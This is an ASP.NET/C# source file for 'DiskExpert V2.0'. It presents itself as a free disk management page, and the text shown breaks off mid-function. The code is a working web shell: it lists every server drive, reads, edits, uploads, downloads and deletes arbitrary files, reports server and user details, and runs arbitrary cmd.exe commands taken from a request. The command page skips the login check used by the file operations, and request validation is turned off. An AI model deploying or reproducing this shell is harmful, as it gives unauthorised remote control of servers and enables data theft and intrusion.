<!-- Asp.NET 磁盘管理系统(DiskExpert)V2.0 --------------------------
|
| 本代码完全公开和免费，你可以任意复制、传播、修改和使用
|
| 本程序由 Zzy2740(POT) 编写，转载时请保留此信息
|
| 网站：http://WwW.Myule.CoM  Email：Zzy2740＠HotMail.Com
|
| 日期：2004-12-20
---------------------------------------------------------------------->
<HTML><HEAD><title>DiskExpert V2.0 Power by Pot</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">A{cursor: default;}A:visited{TEXT-DECORATION: none; color: 000000}A:hover{TEXT-DECORATION: none}A:link{text-decoration: none; color: 000000}
BODY{FONT-FAMILY: Tahoma; FONT-SIZE: 8pt;SCROLLBAR-FACE-COLOR: #ffffff;SCROLLBAR-HIGHLIGHT-COLOR: #acb0b5;SCROLLBAR-SHADOW-COLOR: #acb0b5;SCROLLBAR-3DLIGHT-COLOR: #ffffff;SCROLLBAR-ARROW-COLOR: #acb0b5;SCROLLBAR-TRACK-COLOR: #ffffff;SCROLLBAR-DARKSHADOW-COLOR: #ffffff;SCROLLBAR-BASE-COLOR: #acb0b5}
TD{FONT-FAMILY: Tahoma;FONT-SIZE: 8pt}DIV{cursor: default;FONT-FAMILY:  Tahoma;FONT-SIZE: 8pt}select {border-width: 1;border-color: #000000;background-color: #efefef;FONT-FAMILY: Tahoma;font-size: 8pt;font-style: bold;}.botton{FONT-SIZE: 8pt;BACKGROUND: url(http://music.myule.com/images/botton_01.gif) no-repeat right bottom;FONT-FAMILY: Tahoma;color: #7E8083;border: 1px solid #ACB0B5;}.botton1{FONT-SIZE: 8pt;FONT-FAMILY: Tahoma;border: 1px solid #ACB0B5;}
INPUT{BORDER-TOP-WIDTH: 1px;PADDING-RIGHT: 1px;PADDING-LEFT: 1px;BORDER-LEFT-WIDTH: 1px;FONT-SIZE: 8pt;BORDER-LEFT-COLOR: #cccccc;BORDER-BOTTOM-WIDTH: 1px;BORDER-BOTTOM-COLOR: #cccccc;PADDING-BOTTOM: 1px;BORDER-TOP-COLOR: #cccccc;PADDING-TOP: 1px;HEIGHT: 18px;BORDER-RIGHT-WIDTH: 1px;BORDER-RIGHT-COLOR: #cccccc;FONT-FAMILY: Tahoma;}DIV.imagespacer { FLOAT: left; MARGIN: 5px; OVERFLOW: hidden; WIDTH: 90px; PADDING-TOP: 0px; HEIGHT: 90px; TEXT-ALIGN: center }DIV.imageholder { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; VERTICAL-ALIGN: middle; BORDER-LEFT: #cccccc 1px solid; WIDTH: 60px; PADDING-TOP: 15px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 60px; TEXT-ALIGN: center }
DIV.titleHolder { WIDTH: 100%; PADDING-TOP: 2px; HEIGHT: 20px; TEXT-ALIGN: center }
</style></HEAD>
<body style="OVERFLOW: auto" bgColor="#e5eaf0" leftMargin="0" topMargin="0">
<div style="position:absolute; left:0; top:0; width:100%; height:100%; z-index:1">
<table width="98%" height="100%" border="0" align="center" cellPadding="0" cellSpacing="0">
<tr><td vAlign="top" height="45"> <table cellSpacing="0" cellPadding="0" width="100%" border="0">
<form id="form1" name="form1" method="get" action=""><tr><td style="COLOR: #7e8083" height="20"> <DIV id="msviLocalToolbar"><TABLE style="CURSOR: default" cellSpacing="0" cellPadding="0" border="0">
<TR><td align="center" width="88"><a href="http://www.myule.com/guestbook/g_show.aspx" target=_blank>About DiskExpert</a></td><TD align="center" width="6"><font color="#cecfd0">|</font></TD><td align="center" width="60"><a href="mailto:zzy2740@hotmail.com">Contact Me</A></td><TD align="center" width="6"><font color="#cecfd0">|</font></TD><td align="center" width="30"><a href="http://www.myule.com/guestbook/g_show.aspx" target=_blank>Help</A></td><TD align="center" width="6"><font color="#cecfd0">|</font></TD><td align="center" width="80"><a href="?Action=cmd" target=_blank>执行CMD命令</A></td><TD align="center" width="6"><font color="#cecfd0">|</font></TD><td align="center" width="60"><a href="?Action=info" target=_blank>系统信息</A></td><TD align="center" width="6"><font color="#cecfd0">|</font></TD><td align="center" width="60"><a href="http://www.myule.com/guestbook/g_show.aspx" target=_blank><font color=red>官方讨论区</font></a></A></td><td width="400"> <input id="ObjectNum" type="hidden" name="Hidden2" runat="server"> <input id="FolderUrl" type="hidden" name="hidden" runat="server"> <input id="FolderPath" type="hidden" name="FolderPath" runat="server"></td></TR></TABLE>
</DIV></td></tr>
<tr><td height="1" align="right" bgcolor="#ACB0B5"></td></tr>
<tr><td height="1" align="right" bgcolor="#F7FAFF"></td></tr>
<tr><td align="right"><table cellSpacing="0" cellPadding="0" width="100%" border="0"><tr><td align="center" width="180"> <DIV id="msviLocalToolbar1"><table cellSpacing="0" cellPadding="0" width="95%" border="0"><tr align="center"><td><font color="#cecfd0">|</font></td><td width="18%" height="30"><A onclick="this.style.behavior='url(#default#homepage)';this.setHomePage(window.location.href);return false;" href="#">主页</A></td><td><font color="#cecfd0">|</font></td><td class="lt0" width="18%"><A onclick="window.location.reload();return false;" href="#">刷新</A></td><td><font color="#cecfd0">|</font></td>
<td width="18%"><A href="javascript:window.external.AddFavorite(window.location.href, 'Disk Expert V2.0')" target="_self">收藏</A></td><td><font color="#cecfd0">|</font></td>
<td width="18%" height="20"><A onclick="history.go(-1)" href="#">后退</A></td>
<td><font color="#cecfd0">|</font></td><td width="18%"><asp:HyperLink id=goup runat="server">向上</asp:HyperLink></td><td><font color="#cecfd0">|</font></td></tr></table></DIV></td>
<td width="30"><font color="#7e8083">地址:</font></td><td><INPUT id="NewFolder" style="WIDTH: 100%" type="text" name="text" runat="server"></td><td width="25"><input type="submit" name="Submit" value="→"></td>
<td width="90"><SELECT id="DiskList" onchange="window.location=('?NewFolder='+options[selectedIndex].value)" name="Select1" runat="server"></SELECT></td>
<td width="30"></td></tr></table></td></tr>
<tr><td height="2" align="right" bgcolor="#ACB0B5"><IMG height="1" src="images/spacer.gif" width="1"></td></tr>
</form>
</table></td></tr>
<tr><td vAlign="top" bgColor="#ffffff"><table height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0"><tr><td vAlign="top" width="200"> <div style="OVERFLOW: auto; WIDTH: 200px; HEIGHT: 100%"> 
<table cellSpacing="0" cellPadding="0" width="100%" border="0"><tr><td vAlign="top" height="76"> <table cellSpacing="0" cellPadding="0" width="100%" border="0"><tr><td width="10" height="50">&nbsp;</td>
<td vAlign="top" align="left"><table cellSpacing="0" cellPadding="0" width="100%" border="0"><tr> 
<td vAlign="bottom" height="40"><asp:Label id=leftpic runat="server"></asp:Label></td></tr></table></td></tr>
<tr><td width="10"><IMG height="1" src="images/spacer.gif" width="10"></td><td style="FONT-WEIGHT: bold; FONT-SIZE: 14pt; LINE-HEIGHT: 1.1; FONT-FAMILY: Tahoma" vAlign="bottom"><asp:label id="ListLabel" runat="server"></asp:label></td></tr>
<tr><td width="10" height="10"><hr size="2" color="#6699CC" noshade></td><td><hr size="2" color="#6699CC" noshade></td></tr></table></td></tr>
<tr><td vAlign="top"><table cellSpacing="0" cellPadding="0" width="100%" border="0"><tr><td width="10" height="25"><IMG height="1" src="images/spacer.gif" width="10"></td><td>&nbsp;</td></tr>
<tr><td width="10" height="40">&nbsp;</td><td><span id="filename" style="FONT-SIZE: 8pt; LINE-HEIGHT: 1.3; FONT-FAMILY: Tahoma"></span></td></tr>
<tr><td width="10">&nbsp;</td><td><span id="fileinfo" style="FONT-SIZE: 8pt; FONT-FAMILY: Tahoma"></span></td></tr>
<tr><td height="20">&nbsp;</td><td>&nbsp;</td></tr></table></td></tr></table></div></td>
<td onselectstart="return false;" onclick="return BodyClick()" vAlign="top"> <div style="OVERFLOW: auto; WIDTH: 100%; HEIGHT: 100%"><FONT face="宋体"><asp:literal id="fileShow" runat="server"></asp:literal></FONT></div></td>
</tr></table></td></tr>
<tr><td height="1" bgcolor="#ACB0B5"></td></tr><tr><td height="1" vAlign="top" bgcolor="#F7FAFF"></td></tr>
<tr><td vAlign="top" height="45"> <table cellSpacing="1" cellPadding="0" width="100%" border="0">
<tr><td><table cellSpacing="0" cellPadding="0" width="100%" border="0">
<form id="form2" name="form2" action="faigle.aspx" runat="server"><tr><td height="30"><asp:button id="Button12" runat="server" CssClass="botton" Text="登录系统" Width="70px" onclick="Button12_Click"></asp:button> 
<asp:textbox id="TextBox3" runat="server" Width="80px" Visible="False" TextMode="Password"></asp:textbox> 
<asp:button id="Button13" runat="server" CssClass="botton1" Text="登录" Visible="False" onclick="Button13_Click"></asp:button> 
<asp:button id="Button3" runat="server" CssClass="botton" Text="下载文件" Width="70px" onclick="Button3_Click"></asp:button> 
<asp:button id="Button10" runat="server" CssClass="botton" Text="上传文件" Width="70px" onclick="Button10_Click"></asp:button><INPUT class="botton1" id="UploadFile" style="DISPLAY: none; FONT-SIZE: 9pt" type="file" name="File1" runat="server"><asp:button id="Button4" runat="server" CssClass="botton1" Text="上传" Visible="False" CausesValidation="False" onclick="Button4_Click"></asp:button>
<asp:button id="Button11" runat="server" CssClass="botton" Text="新建..." Width="70px" onclick="Button11_Click"></asp:button> 
<asp:textbox id="TextBox2" runat="server" CssClass="botton1" Width="80px" Visible="False"></asp:textbox> 
<asp:button id="Button1" runat="server" CssClass="botton1" Text="新建文件" Width="60px" Visible="False" onclick="Button1_Click"></asp:button> 
<asp:button id="Button2" runat="server" CssClass="botton1" Text="新建文件夹" Width="70px" Visible="False" onclick="Button2_Click"></asp:button> 
<asp:button id="Button5" runat="server" CssClass="botton" Text="删除文件" Width="70px" onclick="Button5_Click"></asp:button> 
<asp:button id="Button6" runat="server" CssClass="botton" Text="删除文件夹" Width="80px" onclick="Button6_Click"></asp:button> 
<input type="button" id="edit" value="文本编辑" class="botton" onclick="openeditor()" runat="server"> 
<asp:button id="Button14" runat="server" CssClass="botton" Text="重 命 名" Width="70px" onclick="Button14_Click"></asp:button> 
<asp:textbox id="TextBox4" runat="server" CssClass="botton1" Width="80px" Visible="False"></asp:textbox> 
<asp:button id="Button15" runat="server" CssClass="botton1" Text="重命名" Width="60px" Visible="False" onclick="Button15_Click"></asp:button> 
<asp:button id="Button7" runat="server" CssClass="botton1" Text="复制" Width="50px" onclick="Button7_Click"></asp:button> 
<asp:button id="Button8" runat="server" CssClass="botton1" Text="剪切" Width="50px" onclick="Button8_Click"></asp:button> 
<asp:button id="Button9" runat="server" CssClass="botton1" Text="粘贴" Width="50px" onclick="Button9_Click"></asp:button> 
<INPUT id="CurrentFile" type="hidden" name="CurrentFile" runat="server"> 
<INPUT id="CurrentFolder" type="hidden" name="CurrentFolder" runat="server"></td></tr>
</form></table></td></tr>
<tr><td><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr> 
<td style="COLOR: red">&nbsp; <asp:label id="ErrorText" runat="server"></asp:label></td><td width="450" height="25">ASP.net磁盘管理系统V2.0，本程序由Pot编写，<a href="http://www.myule.com" target=_blank>www.myule.com</a>转载请保留此信息</td>
</tr></table></td></tr></table></td>
<SCRIPT language="JavaScript">
var lastDiv = null;var FileNum;var FolderNum;var ClickArea = 0;window.status = "就绪"
FolderNum = form1.ObjectNum.value.split("|")[0];FileNum = form1.ObjectNum.value.split("|")[1];
filename.innerHTML = "共计:&nbsp;"+FileNum+"&nbsp;个对象<br><br>";
fileinfo.innerHTML = "目录:&nbsp;"+FolderNum+"&nbsp;个<br><br>文件:&nbsp;"+(FileNum-FolderNum)+"&nbsp;个";
if(typeof form2.Button7!="undefined"){form2.Button7.disabled = true;form2.Button8.disabled = true;}	
document.form2.CurrentFolder.value = "";document.form2.CurrentFile.value = "";
function BodyClick(){if(ClickArea == 1){ClickArea = 0;return;}else{
filename.innerHTML = "共计:&nbsp;"+FileNum+"&nbsp;个对象<br><br>";fileinfo.innerHTML = "目录:&nbsp;"+FolderNum+"&nbsp;个<br><br>文件:&nbsp;"+(FileNum-FolderNum)+"&nbsp;个";	
if (lastDiv){lastDiv.style.border = "1 solid #CCCCCC";lastDiv.style.background = "white";}
document.form2.CurrentFile.value="";document.form2.CurrentFolder.value="";
if(typeof form2.Button7!="undefined"){form2.Button7.disabled = true;form2.Button8.disabled = true;}
window.status = "就绪";return;}}				
function SelectDiv(theDiv,FileName,lFileName,lFileSize,lFileModify,lFileProperty,isFile)
{if (lastDiv) {lastDiv.style.border = "1 solid #CCCCCC";lastDiv.style.background = "white";}
lastDiv = theDiv;theDiv.style.border = "1 solid #316AC5";theDiv.style.background = "#EBF0FA";
if(isFile == 1){document.form2.CurrentFile.value = FileName;document.form2.CurrentFolder.value = "";
window.status = "文件「"+FileName+"」被选中!";}
else{document.form2.CurrentFolder.value = FileName;document.form2.CurrentFile.value = "";
window.status = "文件夹「"+FileName+"」被选中!";}	
filename.innerHTML = "<b>"+FileName+"</b><br>"+lFileName+"<br><br>"
fileinfo.innerHTML = "修改时间:&nbsp;"+lFileModify+"<br><br>大小:&nbsp;"+lFileSize+"<br><br>"+lFileProperty;
ClickArea = 1;
if(typeof form2.Button7!="undefined"){form2.Button7.disabled = false;form2.Button8.disabled = false;}
return;}		
function OpenObject(FileName,isFile){
if(isFile == 1){
if(typeof form2.Button3=="undefined")alert("登录后才可以下载文件！");
else form2.Button3.click();
}else{
window.location=("?NewFolder="+form1.FolderUrl.value+"\\"+FileName);}}
function GetFileName(){var str = this.location.href;return str.match(/\/([^\?/]*)(\?|$)/)[1];}
document.form1.NewFolder.value = ""+document.form1.FolderPath.value;
function openeditor(){
if(form2.CurrentFile.value==""){alert("请选取一个文件！");return false;}
window.open("about:blank",'editor','scrollbars=1,menubar=0,status=0,width=700,height=500,left=50,top=110,resizable=1');window.open("?Action=edit&url="+form1.FolderUrl.value+"\\"+form2.CurrentFile.value,'editor','scrollbars=1,menubar=0,status=0,width=700,height=500,left=50,top=110,resizable=1');}
</SCRIPT>
</tr></table></div></body></HTML>
<%@ Page language="c#" EnableViewState="false" validateRequest="false"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script language="C#" runat=server>
public void Page_Load(object sender, System.EventArgs e)
{
	try
	{
			if(Session["CutBoard"] == null)Button9.Enabled = false;
			if(Session["admin"] == null){
				TextBox2.Visible = false;Button1.Visible = false;Button2.Visible = false;
				Button10.Visible = false;Button11.Visible = false;Button5.Visible = false;
				Button6.Visible = false;Button7.Visible = false;Button8.Visible = false;
				Button9.Visible = false;Button14.Visible = false;Button3.Visible = false;
				Button4.Visible = false;Button15.Visible = false;
				edit.Style.Add("display","none");
			}
			else{
				Button12.Text = "退出系统";
			}
			//获取驱动器
			string[] drives = System.IO.Directory.GetLogicalDrives();
			DiskList.Items.Add("选择驱动器");
			foreach (string str in drives){DiskList.Items.Add(str);}
			Button3.Attributes.Add("onclick","if(form2.CurrentFile.value==''){alert('请选取一个文件！');return false;}");
			Button5.Attributes.Add("onclick","if(form2.CurrentFile.value==''){alert('请选取一个文件！');return false;}"+
				"else {return confirm('删除选中文件，是否继续？');}");
			Button6.Attributes.Add("onclick","if(form2.CurrentFolder.value==''){alert('请选取一个文件夹！');return false;}"+"else {return confirm('删除选中文件夹，是否继续？');}");

			string strCurrentDir,NewFolder,TempAction;
			NewFolder = Request.QueryString["NewFolder"];
			TempAction = Request.QueryString["Action"];
				
				//分情况显示数据
				if(TempAction == null && NewFolder == null){
					strCurrentDir = Server.MapPath(".");
					DisplayList(strCurrentDir);
				}
				else if(TempAction == "up"){
					strCurrentDir = NewFolder;
					UpFolder(strCurrentDir);
				}
				else if(TempAction == "edit"){
					EditFile(Request.QueryString["url"].ToString());
				}
				else if(TempAction == "save"){
					string saveurl = Request.Form["url"];
					string savecontent = Request.Form["fileContent"];
					string ColseWindow = Request.Form["ColseWindow"];
					SaveFile(saveurl,savecontent,ColseWindow);
				}
				else if(TempAction == "cmd"){
					string cmdstr = Request.Form["cmdstr"];
					ShowCmd(cmdstr);
				}
				else if(TempAction == "info"){
					SysInfo();
				}
				else{
					strCurrentDir = NewFolder;
					DisplayList(strCurrentDir);
				}
			}
			catch (System.IO.IOException) 
			{
				ErrorText.Text = "An I/O error occurs.";
			}
			catch (System.Security.SecurityException) 
			{
				ErrorText.Text = "The caller does not have the required permission.";
			}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
			}
			}

		#region Files and Directorys List
		/// <summary>
		/// 显示文件和文件夹列表。
		/// </summary>
		public void DisplayList(string strCurrentDir)
		{
			strCurrentDir = strCurrentDir.Replace(@"：",@":").Replace(@"、",@"\").Replace(@"\\",@"\");	
			FileInfo fi;
			DirectoryInfo di;
			StringBuilder TempStr = new StringBuilder();
			TempStr.Capacity = 100;
			string FileName,FileExe,FilePic,FileSize,ShortName;
			DateTime FileModify;
			string lFileProperty = "1";
			string lFileName,lFileModify,lFileSize;
			int isFile,FileNum=0,FolderNum=0;

			fileShow.Text = "";						//初始化显示层
			DirectoryInfo dir = new DirectoryInfo(strCurrentDir);
			foreach(FileSystemInfo fsi in dir.GetFileSystemInfos())
			{
				FilePic = "";FileName = "";FileExe = "";FileSize = "0";FileNum++;

				if(fsi is FileInfo)
				{
					isFile = 1;
					fi = (FileInfo)fsi;
					FileName = fi.Name;
					FileExe = fi.Extension;
					lFileProperty = fi.Attributes.ToString();
				
					if(fi.Length > (1024*1024*1024))
						FileSize = ((double)fi.Length/(1024*1024*1024)).ToString(".##")+"&nbsp;GB";
					else if(fi.Length > (1024*1024))
						FileSize = ((double)fi.Length/(1024*1024)).ToString(".##")+"&nbsp;MB";
					else if(fi.Length > 1024)
						FileSize = ((double)fi.Length/1024).ToString(".##")+"&nbsp;KB";
					else
						FileSize = ((double)fi.Length/1).ToString(".##")+"&nbsp;字节";
						FileModify = fi.LastWriteTime;

					switch(FileExe.ToLower())
					{
						//用户可以自定义FilePic内容，显示不同类型的文件。
						case ".gif":FilePic = "images/gif.gif";ShortName = "GIF图象";break;
						case ".jpg":FilePic = "images/gif.gif";ShortName = "JPEG图象";break;
						case ".asp":FilePic = "images/asp.gif";ShortName = "Active Server Page";break;
						case ".txt":FilePic = "images/txt.gif";ShortName = "文本文档";break;
						case ".htm":FilePic = "images/htm.gif";ShortName = "HTML Document";break;
						case ".html":FilePic = "images/htm.gif";ShortName = "HTML Document";break;
						case ".doc":FilePic = "images/doc.gif";ShortName = "Microsoft Word 文档";break;
						case ".exe":FilePic = "images/exe.gif";ShortName = "应用程序";break;
						case ".rar":FilePic = "images/zip.gif";ShortName = "WinRAR 档案文件";break;
						case ".zip":FilePic = "images/zip.gif";ShortName = "WinRAR Zip 档案文件";break;
						case ".aspx":FilePic = "images/aspx.gif";ShortName = "ASP.NET Server Page";break;
						case ".cs":FilePic = "images/cs.gif";ShortName = "C# Source file";break;
						case ".mdb":FilePic = "images/mdb.gif";ShortName = "Microsoft Access 应该程序";break;
						case ".dll":FilePic = "images/dll.gif";ShortName = "应用程序扩展";break;
						case ".wma":FilePic = "images/mp3.gif";ShortName = "Winamp media file";break;
						case ".mp3":FilePic = "images/mp3.gif";ShortName = "Winamp media file";break;
						default:FilePic = "images/other.gif";ShortName = FileExe.Replace(".","")+"文件";break;
					}
					//FilePic = "<img src='"+FilePic+"'border=0 align=absmiddle>";
					FilePic = "<font face='wingdings' color='#666666' style='font-size:30'>&#50;</font>";

					lFileName = ShortName.Replace(" ","&nbsp;").ToString();
					lFileSize = FileSize.ToString();
					lFileModify = FileModify.ToString();
				}
				else
				{
					FolderNum++;isFile = 0;
					di = (DirectoryInfo)fsi;
					FileName = di.Name;
					//FileName = Server.UrlEncode(FileName);
					FileExe = di.Extension;
					FileModify = di.LastWriteTime;
					//FilePic = "<img src='images/directory.gif' border=0 align=absmiddle>";
					FilePic = "<font face='wingdings' color='#666666' style='font-size:30'>&#48;</font>";

					lFileName = "文件夹";
					lFileSize = "0&nbsp;字节";
					lFileModify = FileModify.ToString();
					lFileProperty = di.Attributes.ToString();

				}
				TempStr.Append("<div class=imagespacer><div class=imageholder onclick=\"SelectDiv(this,'"+FileName.Replace(" ","&nbsp;").ToString()+"','"+lFileName.ToString()+"','"+lFileSize.ToString()+"','"+FileModify.ToString().Replace(" ","&nbsp;").ToString()+"','"+lFileProperty.Replace(" ","&nbsp;").ToString()+"',"+isFile+")\" ondblclick=\"OpenObject('"+Server.UrlEncode(FileName)+"',"+isFile+")\">"+FilePic+"</div><div class=titleholder>"+FileName+"</div></div>");
			}
			fileShow.Text = TempStr.ToString();
			FolderPath.Value = strCurrentDir;
			FolderPath.Value = strCurrentDir;
			FolderUrl.Value = Server.UrlEncode(strCurrentDir);
			ObjectNum.Value = FolderNum+"|"+FileNum;
			if(Path.GetFileName(strCurrentDir) != "")
			{
				leftpic.Text = "<b><font face='wingdings' color='#6699CC' style='font-size:30'>&#48;</font></b>";
				//ListImage.ImageUrl = "images/left_directory.gif";
				ListLabel.Text = Path.GetFileName(strCurrentDir);
				goup.NavigateUrl = GetFileName()+"?Action=up&NewFolder="+FolderUrl.Value;
				//IMG1.Src = "images/turnup.gif";				//IMG1.Attributes.Add("onclick","window.location=('faigle.aspx?Action=up&NewFolder='+form1.FolderUrl.value)");
			}
			else
			{
				leftpic.Text = "<b><font face='wingdings' color='#6699CC' style='font-size:30'>&#59;</font></b>";
				//ListImage.ImageUrl = "images/left_disk.gif";
				ListLabel.Text = Directory.GetDirectoryRoot(strCurrentDir);
				goup.Enabled = false;
				//IMG1.Src = "images/turnup1.gif";
			}
		}
		#endregion

		#region Operate Files and Directorys
		/// <summary>
		/// 获取当前文档名。
		/// </summary>
		private string GetFileName()
		{
			Uri nUrl = HttpContext.Current.Request.Url;
			string sFileName = nUrl.Segments[nUrl.Segments.Length-1];
			int i=sFileName.LastIndexOf("/");
			int j=sFileName.Length;
			sFileName = sFileName.Substring(i+1,j-i-1);
			return sFileName;			
		}
		/// <summary>
		/// 编辑文本文件。
		/// </summary>
		private void EditFile(string url)
		{
			if(!Chk_Purview())return;
			try{
			url = Server.UrlDecode(Server.UrlEncode(url).Replace("%c2%a0","+"));
			if(url == Path.Combine(Server.MapPath("."),GetFileName())){
				Response.Write("<script language=javascript>alert('提示信息：不准碰我!!!>:-<');window.close()<"+"/script>");
				return;
			}
			FileStream fs = new FileStream(url,FileMode.Open,FileAccess.Read);
			StreamReader sr = new StreamReader(fs,Encoding.GetEncoding("gb2312"));
			string fileContent = sr.ReadToEnd();
			sr.Close();
			fs.Close();

			Response.Write("<html><head><title>DiskExpert V2.0 Power By Pot</title><meta http-equiv='Content-Type' content='text/html; charset=gb2312'><style>form{margin:0;font-size:9pt;}; textarea{font-family:Tahoma;font-size:9pt; padding:5px;};body{margin:2;border:none;overflow:hidden;background-color:buttonface}; fieldset{margin:2px;font-size:9pt;height:76px;overflow:auto;}; input{font-family:Tahoma;font-size:9pt;};pre{margin:0};.banner{margin-top:8px;margin-right:10px;text-align:right;font-family:Tahoma;font-weight:bold};</style></head><script>window.focus();<"+"/script><body><form style='width:100%;height:100%;' method='post' action='"+GetFileName()+"?Action=save'><textarea name=fileContent style='width:100%;height:88%;'>"+fileContent+"</textarea><br><div style='padding-top:5px'>&nbsp;&nbsp;文件路径：<input type='text' name=url value='"+url+"' readonly><input type='hidden' name=a value=s> <input type=checkbox name=ColseWindow id=chk_closewindow value=close><label for=chk_closewindow checked>保存完毕关闭窗口</label> <input type='submit' name=btnSubmit value='保存' style='width:75px;' onclick=\"form.a.value='s'\"><input type='reset' name=btnReset value='恢复' style='width:75px;'><input type='button' name=btnReset value='清空' style='width:75px;' onclick=\"form.fileContent.value=''\"><input type='button' name=btnReset value='关闭' style='width:75px;' onclick=\"window.close();\"></div><div class=banner>Online Text Editor 1.0 for  DiskExpert V2.0</div></form></body></html>");
			Response.End();
			return;
			}
			catch
			{
				return;
			}
		}
		/// <summary>
		/// 保存文本文件。
		/// </summary>
		private void SaveFile(string url,string fileContent,string ColseWindow)
		{
			if(!Chk_Purview())return;
			try{
			url = Server.UrlDecode(Server.UrlEncode(url).Replace("%c2%a0","+"));
			FileStream fs = new FileStream(url,FileMode.Create,FileAccess.Write);
			StreamWriter sw = new StreamWriter(fs,Encoding.GetEncoding("gb2312"));
			sw.Write(fileContent);	
			sw.Close();
			fs.Close();
			}
			catch(Exception ex)
			{
				Response.Write("<script language=javascript>alert('"+ex.Message+"！');window.close()<"+"/script>");
				//ErrorText.Text = ex.Message;
				return;
			}
			if(ColseWindow == "close")
			{
					Response.Write("<script language=javascript>alert('保存成功！');window.close()<"+"/script>");
			}
			else
			{
					Response.Write("<script language=javascript>alert('保存成功！');history.go(-1);<"+"/script>");
			}
		}
		/// <summary>
		/// 显示CMD窗体。
		/// </summary>
		private void ShowCmd(string cmdstr)
		{
			try{
			Response.Write("<html><style type='text/css'>body,td,th,input,per{font-size:14px;font-family:Verdana, Arial;}</style><head><meta http-equiv='Content-Type' content='text/html; charset=gb2312'><title>DiskExpert V2.0 Power By Pot</title></head><body><form name='form1' method='post' action='?Action=cmd'>Cmd命令：<input name='cmdstr' type='text' style='border: 1px solid #084B8E' value='"+cmdstr+"'> <input type='submit' name='Button1' value='执行' id='Button1' style='color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5'/></form><hr noshade><pre>"+RunCmd(cmdstr)+"</pre></body></html>");
			Response.End();
			return;
			}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
				return;
			}			
		}
		/// <summary>
		/// 执行CMD命令。
		/// </summary>
		private string RunCmd(string strCmd){
			string rInfo;
			try{
				Process myProcess = new Process();
				ProcessStartInfo myProcessStartInfo = new ProcessStartInfo("cmd.exe");
				myProcessStartInfo.UseShellExecute = false;
				myProcessStartInfo.RedirectStandardOutput = true;
				myProcess.StartInfo = myProcessStartInfo;
				myProcessStartInfo.Arguments = "/c " + strCmd;
				myProcess.Start();
				StreamReader myStreamReader = myProcess.StandardOutput;
				rInfo = myStreamReader.ReadToEnd();
				myProcess.Close();
				rInfo = strCmd +"\r\n"+ rInfo;
				return rInfo;
			}
			catch(Exception ex){
				return ex.Message;
				}			
		}
		/// <summary>
		/// 系统信息。
		/// </summary>
		private void SysInfo(){
				Response.Write("<html><head><meta http-equiv='Content-Type' content='text/html; charset=gb2312'><title>DiskExpert V2.0 Power By Pot</title><style>td{font-size:14px}</style></head><body><table width='80%'  border='1' align='center' cellpadding='2' style='border-collapse: collapse;'><tr><td colspan='2'><font color='#FF0000'>Web服务器信息</font></td></tr><tr><td width='40%'>服务器IP</td><td width='60%'>"+Request.ServerVariables["LOCAL_ADDR"]+"</td></tr><tr><td>机器名</td><td>"+Environment.MachineName+"</td></tr><tr><td>网络域名</td><td>"+Environment.UserDomainName.ToString()+"</td></tr><tr><td>当前进程的用户名</td><td>"+Environment.UserName+"</td></tr><tr><td>操作系统</td><td>"+Environment.OSVersion.ToString()+"</td></tr><tr><td>IIS版本</td><td>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</td></tr><tr><td colspan='2'><font color='#FF0000'>客户端信息</font></td></tr><tr><td>客户端IP</td><td>"+Request.ServerVariables["REMOTE_ADDR"]+"</td></tr><tr><td>用户标识</td><td>"+Request.ServerVariables["HTTP_USER_AGENT"]+"</td></tr></table></body></html>");
				Response.End();		
		}
		/// <summary>
		/// 返回上一级。
		/// </summary>
		private void UpFolder(string strCurrentDir)
		{
			string UpPath = new FileInfo(strCurrentDir).DirectoryName;
			DisplayList(UpPath);
			FolderPath.Value = UpPath;
			FolderUrl.Value = Server.UrlEncode(UpPath);
			return;
		}
		/// <summary>
		/// 下载文件。
		/// </summary>
		private void Button3_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			try
			{
				string FilePath = Path.Combine(FolderPath.Value,CurrentFile.Value);
				FilePath = Server.UrlDecode(Server.UrlEncode(FilePath).Replace("%c2%a0","+"));
				if(FilePath == Path.Combine(Server.MapPath("."),GetFileName())){
					Response.Write("<script language=javascript>alert('提示信息：不准碰我!!!>:-<');<"+"/script>");
					return;
				}
					FileInfo fi = new FileInfo(FilePath);
					FileStream fs = new FileStream(FilePath, FileMode.Open);
					byte[] bytes = new byte[(int)fs.Length];
					fs.Read(bytes, 0, bytes.Length);
					fs.Close();
					Response.Clear();
					Response.ContentType = "application/octet-stream";
					Response.AddHeader("Content-Disposition", "attachment; filename="+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8).Replace("+"," "));
					Response.BinaryWrite(bytes);
					Response.End();
			}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
				return;
			}
		}
		/// <summary>
		/// 上传文件。
		/// </summary>
		private void Button4_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			try
			{
				HttpPostedFile hpf = UploadFile.PostedFile;
				//FileName.Text = hpf.FileName;
				if(hpf.ContentLength > 5242880)
				{
					Response.Write("<script language=javascript>alert('上传文件太大，系统限制最大为5M！');<"+"/script>");
					return;
				}
				char[] de = {'\\'};
				string[] AFilename = hpf.FileName.Split(de);
				string strFilename = AFilename[AFilename.Length - 1];
				FileInfo fi = new FileInfo(Path.Combine(FolderPath.Value,strFilename));
				if(fi.Exists)
				{
					Response.Write("<script language=javascript>alert('文件已经存在，请先删除再上传？');<"+"/script>");
					return;
				}
				else
				{
					hpf.SaveAs(FolderPath.Value+@"\"+strFilename);
					Response.Write("<script language=javascript>alert('文件已经上传！');<"+"/script>");
					DisplayList(FolderPath.Value);
					return;
				}	
			}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
				return;
			}
		}
		/// <summary>
		/// 删除文件。
		/// </summary>
		private void Button5_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
